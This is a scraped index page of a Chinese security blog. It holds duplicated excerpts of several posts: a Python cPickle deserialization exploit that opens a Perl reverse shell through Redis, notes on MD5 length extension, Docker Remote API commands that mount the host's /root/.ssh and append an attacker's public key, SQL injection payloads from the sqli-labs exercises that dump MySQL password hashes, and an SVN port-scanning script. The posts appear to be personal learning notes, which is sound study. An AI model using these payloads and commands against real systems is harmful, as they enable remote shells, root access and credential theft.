<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
</blockquote>
<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
import cPickle
import os
import redis

class exp(object):
    def __reduce__(self):
        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
        return (os.system, (s,))
   
e &#x3D; exp()
s &#x3D; cPickle.dumps(e)

r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>

	

	</div>
  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
<blockquote>
<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
</blockquote>
<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
import cPickle
import os
import redis

class exp(object):
    def __reduce__(self):
        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
        return (os.system, (s,))
   
e &#x3D; exp()
s &#x3D; cPickle.dumps(e)

r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>

	
	</div>
  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/07/25/hash-length-attack.html" >MD5哈希长度扩展攻击</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-07-25  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
</blockquote>
<p>这篇文章里有提到的哈希长度扩展攻击看了下做个笔记。理解哈希长度扩展攻击以md5为例，需要理解下面几点：</p>
<h3 id="MD5的部分工作原理"><a href="#MD5的部分工作原理" class="headerlink" title="MD5的部分工作原理"></a>MD5的<strong>部分工作原理</strong></h3><h4 id="一-先看下MD5的计算过程，只需要理解一半："><a href="#一-先看下MD5的计算过程，只需要理解一半：" class="headerlink" title="一. 先看下MD5的计算过程，只需要理解一半："></a>一. 先看下MD5的计算过程，只需要理解一半：</h4><p> 对于一个message进行md5计算的过程是这样的：<br> 经过三个步骤，这部分可以看<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p>
<p> The message is “padded” (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   先进行补位，使得整体长度对512取模之后的值为448，len(message)%512 == 418，计算单位是bit（位）。</p>
<ol>
<li><p>Append Padding Bits</p>
<p> 补位是这样的，先在message后面加0x80标识，然后加无限个0，一直满足对512bit取模之后等于448bit。</p>
</li>
<li><p>Append Length</p>
<p> 512bit和448相差64bit，即8Byte，这个8字节用来表示补位之前message的长度。</p>
</li>
<li><p>计算消息摘</p>
<p>有一个初始链变量，用来参与第一轮的运算，MD5的初始变量为：<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p>
</li>
</ol>
<p> 整体来说就是先补位，然后补长度，这个长度占8Byte，用来表示补位之前message的长度，然后计算md5。现在记住下面这句话：</p>
<blockquote>
<p>每经过一次消息摘要计算，上面的<strong>链变量会被新的值覆盖</strong>，最后一轮经过高低位互换（aabbccdd -&gt; ddccbbaa）就是最终的MD5值。</p>
</blockquote>
<p>现在来进行md5扩展长度攻击：<br>我觉得直接把这个看完就差不多了：<a target="_blank" rel="noopener" href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
	

	</div>
  <a type="button" href="/2016/07/25/hash-length-attack.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
</blockquote>
<p>这篇文章里有提到的哈希长度扩展攻击看了下做个笔记。理解哈希长度扩展攻击以md5为例，需要理解下面几点：</p>
<h3 id="MD5的部分工作原理"><a href="#MD5的部分工作原理" class="headerlink" title="MD5的部分工作原理"></a>MD5的<strong>部分工作原理</strong></h3><h4 id="一-先看下MD5的计算过程，只需要理解一半："><a href="#一-先看下MD5的计算过程，只需要理解一半：" class="headerlink" title="一. 先看下MD5的计算过程，只需要理解一半："></a>一. 先看下MD5的计算过程，只需要理解一半：</h4><p> 对于一个message进行md5计算的过程是这样的：<br> 经过三个步骤，这部分可以看<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p>
<p> The message is “padded” (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   先进行补位，使得整体长度对512取模之后的值为448，len(message)%512 == 418，计算单位是bit（位）。</p>
<ol>
<li><p>Append Padding Bits</p>
<p> 补位是这样的，先在message后面加0x80标识，然后加无限个0，一直满足对512bit取模之后等于448bit。</p>
</li>
<li><p>Append Length</p>
<p> 512bit和448相差64bit，即8Byte，这个8字节用来表示补位之前message的长度。</p>
</li>
<li><p>计算消息摘</p>
<p>有一个初始链变量，用来参与第一轮的运算，MD5的初始变量为：<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p>
</li>
</ol>
<p> 整体来说就是先补位，然后补长度，这个长度占8Byte，用来表示补位之前message的长度，然后计算md5。现在记住下面这句话：</p>
<blockquote>
<p>每经过一次消息摘要计算，上面的<strong>链变量会被新的值覆盖</strong>，最后一轮经过高低位互换（aabbccdd -&gt; ddccbbaa）就是最终的MD5值。</p>
</blockquote>
<p>现在来进行md5扩展长度攻击：<br>我觉得直接把这个看完就差不多了：<a target="_blank" rel="noopener" href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
	
	</div>
  <a type="button" href="/2016/07/25/hash-length-attack.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/05/18/docker-remote-exploit.html" >Docker Remote API Exploit</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-05-18  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>Source:</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
</ul>
<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
	

	</div>
  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>Source:</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
</ul>
<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
	
	</div>
  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/05/05/sqli-labs-less-16.html" >SQL报错注入</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-05-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h2 id="注入的方法"><a href="#注入的方法" class="headerlink" title="注入的方法"></a>注入的方法</h2><p>   <code>sqli-labs</code>的1，2，3，4课都可以使用以下四种来进行注入数据:</p>
<ul>
<li>Union select</li>
<li>Error based</li>
<li>Blind based</li>
<li>Time blind based</li>
</ul>
<p>   对应的可以使用<code>sqlmap.py --technique </code>上面首字母大写来指定相应的注入类型。</p>
<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>   第五课首先排除union注入，因为页面无法显示数据，最后我还是看了网页源代码才注入的。</p>
<blockquote>
<p> 我发现sqlmap在每次注入的时候都会先尝试确定当前变量是被那种包含，然后在payload里面闭合，这样可以确保整个语句的完整性。 要么确定当前语句完全闭合，要么注释掉后面的语句，确保闭合。</p>
</blockquote>
<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>   报错和union查询都出不了数据，只能进行盲注。bool blind和time blind。前面闭合可以使用<code>&#39;</code>或者<code>&#39;)</code>。</p>
<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3>
	

	</div>
  <a type="button" href="/2016/05/05/sqli-labs-less-16.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="注入的方法"><a href="#注入的方法" class="headerlink" title="注入的方法"></a>注入的方法</h2><p>   <code>sqli-labs</code>的1，2，3，4课都可以使用以下四种来进行注入数据:</p>
<ul>
<li>Union select</li>
<li>Error based</li>
<li>Blind based</li>
<li>Time blind based</li>
</ul>
<p>   对应的可以使用<code>sqlmap.py --technique </code>上面首字母大写来指定相应的注入类型。</p>
<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>   第五课首先排除union注入，因为页面无法显示数据，最后我还是看了网页源代码才注入的。</p>
<blockquote>
<p> 我发现sqlmap在每次注入的时候都会先尝试确定当前变量是被那种包含，然后在payload里面闭合，这样可以确保整个语句的完整性。 要么确定当前语句完全闭合，要么注释掉后面的语句，确保闭合。</p>
</blockquote>
<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>   报错和union查询都出不了数据，只能进行盲注。bool blind和time blind。前面闭合可以使用<code>&#39;</code>或者<code>&#39;)</code>。</p>
<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3>
	
	</div>
  <a type="button" href="/2016/05/05/sqli-labs-less-16.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/04/19/sqli-labs-less-1.html" >sqli-labs-Less-1</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-04-19  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>  网上关于这个的比较多，第一节课程是单引号注入，一般讲的都比较简单，加一个单引号闭合就行了，但是怎么注入数据呐。因为刚刚开始学，所以我翻了下源代码和数据库，注入出来的payload是这样的：<br><code>2&#39; union select group_concat(id,user()),group_concat(username,@@version),group_concat(password, (select hex(password) from mysql.user limit 1)) from users where id=3 order by id desc -- -</code></p>
<p>简化一下语句是这样的select * from users where id=2 union select 1,2,3,mid((select password from mysql.user limit 1),N,1) order by id</p>
<p>union前后的字段数必须一样，union后面的数据可以自己发挥，如何让页面显示注入之后数据可以使用 order by，因为php语句是只显示sql里面第一行结果，所以要让我们注入出来的在第一行显示。 </p>
<h2 id="Error-based"><a href="#Error-based" class="headerlink" title="Error based"></a>Error based</h2><blockquote>
<p>首先报错注入要注意闭合语句，比如<code>id=1</code>，如果在PHP里面是这样的<code>select * from users where id=&#39;$id&#39;</code>，其中变量是被单引号包围，在使用报错注入的时候一定要闭合单引号,同理其他符号也是。</p>
</blockquote>
<h3 id="BIGINT溢出错误"><a href="#BIGINT溢出错误" class="headerlink" title="BIGINT溢出错误"></a>BIGINT溢出错误</h3><p>上面是union的注入情况，然后是报错注入如下：<br><code>select * from users where id=1 and !(select*from(select user())x)+~0</code><br>地址栏输入这样的语句<br><code>2&#39; and !(select*from(select+user())x)%2b~0</code>(注意单引号闭合，如果没有闭合还是出现正常的结果。</p>
<pre><code>本文的攻击之所以得逞，是因为mysql_error()会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。 这一功能，是在5.5.5及其以上版本提供的。
</code></pre>
<p>source:<a target="_blank" rel="noopener" href="http://drops.wooyun.org/web/8024">http://drops.wooyun.org/web/8024</a></p>
<h3 id="EXP溢出错误"><a href="#EXP溢出错误" class="headerlink" title="EXP溢出错误"></a>EXP溢出错误</h3>
	

	</div>
  <a type="button" href="/2016/04/19/sqli-labs-less-1.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>  网上关于这个的比较多，第一节课程是单引号注入，一般讲的都比较简单，加一个单引号闭合就行了，但是怎么注入数据呐。因为刚刚开始学，所以我翻了下源代码和数据库，注入出来的payload是这样的：<br><code>2&#39; union select group_concat(id,user()),group_concat(username,@@version),group_concat(password, (select hex(password) from mysql.user limit 1)) from users where id=3 order by id desc -- -</code></p>
<p>简化一下语句是这样的select * from users where id=2 union select 1,2,3,mid((select password from mysql.user limit 1),N,1) order by id</p>
<p>union前后的字段数必须一样，union后面的数据可以自己发挥，如何让页面显示注入之后数据可以使用 order by，因为php语句是只显示sql里面第一行结果，所以要让我们注入出来的在第一行显示。 </p>
<h2 id="Error-based"><a href="#Error-based" class="headerlink" title="Error based"></a>Error based</h2><blockquote>
<p>首先报错注入要注意闭合语句，比如<code>id=1</code>，如果在PHP里面是这样的<code>select * from users where id=&#39;$id&#39;</code>，其中变量是被单引号包围，在使用报错注入的时候一定要闭合单引号,同理其他符号也是。</p>
</blockquote>
<h3 id="BIGINT溢出错误"><a href="#BIGINT溢出错误" class="headerlink" title="BIGINT溢出错误"></a>BIGINT溢出错误</h3><p>上面是union的注入情况，然后是报错注入如下：<br><code>select * from users where id=1 and !(select*from(select user())x)+~0</code><br>地址栏输入这样的语句<br><code>2&#39; and !(select*from(select+user())x)%2b~0</code>(注意单引号闭合，如果没有闭合还是出现正常的结果。</p>
<pre><code>本文的攻击之所以得逞，是因为mysql_error()会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。 这一功能，是在5.5.5及其以上版本提供的。
</code></pre>
<p>source:<a target="_blank" rel="noopener" href="http://drops.wooyun.org/web/8024">http://drops.wooyun.org/web/8024</a></p>
<h3 id="EXP溢出错误"><a href="#EXP溢出错误" class="headerlink" title="EXP溢出错误"></a>EXP溢出错误</h3>
	
	</div>
  <a type="button" href="/2016/04/19/sqli-labs-less-1.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/04/15/svn-scan.html" >SVN匿名扫描</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-04-15  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>程序是最开始学习Python写的，基本是东拼西凑，从这个程序开始接触多进程。有两个版本第一种是直接使用<code>sock</code>的<code>connect</code>连接来判断，第二种使用了<code>scapy</code>，本着追求最快的程序，结果使用<code>scapy</code>比<code>socket</code>要慢好多。</p>
<p>下面是第一个程序，使用<code>socket</code>扫描:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*-coding:utf-8-*-</span>

<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span>PIPE
<span class="token keyword">import</span> re
<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
<span class="token keyword">import</span> socket
<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os

iplist <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
            s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> s<span class="token punctuation">.</span>connect_ex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3690</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
                <span class="token punctuation">(</span>out<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">:</span>
                     <span class="token keyword">print</span> ip
            s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
       ip <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
       <span class="token keyword">try</span><span class="token punctuation">:</span>
            svn_scan<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
       <span class="token keyword">finally</span><span class="token punctuation">:</span>
            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span>iplist<span class="token punctuation">)</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>然后是使用了<code>scapy</code>的<code>syn</code>扫描：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> logging
logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span> <span class="token comment">#关闭import scapy的警告</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE
<span class="token keyword">import</span> re
<span class="token keyword">import</span> time
<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
<span class="token keyword">import</span> threading

conf<span class="token punctuation">.</span>verb <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#关闭输出</span>
targets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ans <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> ans <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">elif</span> ans<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> ans<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">18</span><span class="token punctuation">:</span>
